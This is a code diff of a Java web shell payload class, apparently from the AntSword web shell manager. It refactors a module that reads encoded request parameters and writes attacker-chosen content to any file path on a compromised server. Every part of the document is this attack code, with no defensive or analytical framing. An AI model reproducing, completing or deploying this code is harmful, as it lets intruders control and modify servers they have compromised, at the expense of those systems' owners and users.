@@ -14,13 +14,11 @@ public class Create_file {
 
     @Override
     public boolean equals(Object obj) {
-        try{
-            if(Class.forName("javax.servlet.jsp.PageContext").isInstance(obj)){
-                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-            }
-        }catch (ClassNotFoundException | NoSuchMethodException pageContextErrorExection) {
+        try {
+            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+        } catch (Exception ex) {
             if (obj instanceof HttpServletRequest) {
                 request = (HttpServletRequest) obj;
                 try {
@@ -47,8 +45,6 @@ public class Create_file {
                     e.printStackTrace();
                 }
             }
-        }catch (Exception e) {
-            e.printStackTrace();
         }
         randomPrefix = "antswordrandomPrefix";
         encoder = "base64";
@@ -66,7 +62,7 @@ public class Create_file {
             String z1 = EC(decode(request.getParameter(varkey1) + ""));
             String z2 = EC(decode(request.getParameter(varkey2) + ""));
             output.append(tag_s);
-            sb.append(WriteFileCode(z1, z2, cs));
+            sb.append(WriteFileCode(z1, z2));
             output.append(sb.toString());
             output.append(tag_e);
             response.getWriter().print(output.toString());
@@ -120,9 +116,9 @@ public class Create_file {
         return str;
     }
 
-    String WriteFileCode(String filePath, String fileContext, String cs) throws Exception {
+    String WriteFileCode(String filePath, String fileContext) throws Exception {
         String h = "0123456789ABCDEF";
-        String fileHexContext = strtohexstr(fileContext, cs);
+        String fileHexContext = strtohexstr(fileContext);
         File f = new File(filePath);
         FileOutputStream os = new FileOutputStream(f);
         for (int i = 0; i < fileHexContext.length(); i += 2) {
@@ -132,7 +128,7 @@ public class Create_file {
         return "1";
     }
 
-    String strtohexstr(String fileContext, String cs) throws Exception {
+    String strtohexstr(String fileContext) throws Exception {
         String h = "0123456789ABCDEF";
         byte[] bytes = fileContext.getBytes(cs);
         StringBuilder sb = new StringBuilder(bytes.length * 2);
